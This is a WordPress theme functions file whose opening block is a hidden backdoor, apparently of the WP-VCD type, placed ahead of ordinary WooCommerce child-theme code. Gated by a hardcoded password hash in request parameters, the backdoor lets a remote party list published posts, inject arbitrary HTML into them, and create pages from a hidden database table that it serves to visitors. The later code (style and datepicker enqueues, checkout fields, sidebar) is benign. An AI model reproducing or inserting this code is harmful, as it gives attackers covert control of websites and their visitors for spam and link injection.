<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '265ad82b450108ec0aa6bc59d7d206ba'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php

// Remove each style one by one
add_filter ( 'woocommerce_enqueue_styles', 'human_dequeue_styles' );

function human_dequeue_styles ( $enqueue_styles ) {
            //unset ( $enqueue_styles[ 'woocommerce-general' ] ); // Remove the gloss
            //   unset ( $enqueue_styles[ 'woocommerce-layout' ] );  // Remove the layout
            //   unset ( $enqueue_styles[ 'woocommerce-smallscreen' ] ); // Remove the smallscreen optimisation
            return $enqueue_styles;
}

if ( is_singular ( 'product' ) !== null ) {
            add_action ( 'wp_enqueue_scripts', 'human_single_product_scripts' );
            //human_single_product_scripts();
}

function human_single_product_scripts () {

            wp_dequeue_script ( 'jquery' );
            wp_dequeue_script ( 'jquery-ui-datepicker' );
            wp_enqueue_script ( 'jquery' );
            wp_enqueue_style ( 'human-datepicker-ui', HUMAN_CHILD_URL . '/assets/css/datepicker/css/jquery-ui-1.10.1.css', array (
                        'human-parent-css' ) );
            wp_enqueue_style ( 'human-datepicker', HUMAN_CHILD_URL . '/assets/css/datepicker/css/cangas.datepicker.css', array (
                        'human-datepicker-ui' ) );

            wp_enqueue_script ( 'jquery-ui-core', array (
                        'jquery' ) );
            wp_enqueue_script ( 'jquery-ui-datepicker', array (
                        'jquery-ui-core' ) );
}

add_filter ( 'woocommerce_checkout_fields', 'custom_override_checkout_fields' );

// Our hooked in function - $fields is passed via the filter!
function custom_override_checkout_fields ( $fields ) {
            $fields[ 'order' ][ 'order_comments' ] = array (
                        'type' => 'textarea',
                        'class' => array (
                                    'notes' ),
                        'label' => __ ( 'Order Notes', 'woocommerce' ),
                        'placeholder' => _x ( 'Notes about your order, e.g. special notes for delivery.', 'placeholder', 'woocommerce' )
            );
            //$fields[ 'order' ][ 'order_comments' ][ 'label' ] = 'My new label';
            return $fields;
}

if ( function_exists ( 'register_sidebar' ) ) {
            register_sidebar ( array (
                        'id' => 'side-bar-1',
                        'name' => 'side-bar-1',
                        'before_widget' => '<div class = "widgetizedArea">',
                        'after_widget' => '</div>',
                        'before_title' => '<h3>',
                        'after_title' => '</h3>',
                        )
            );
}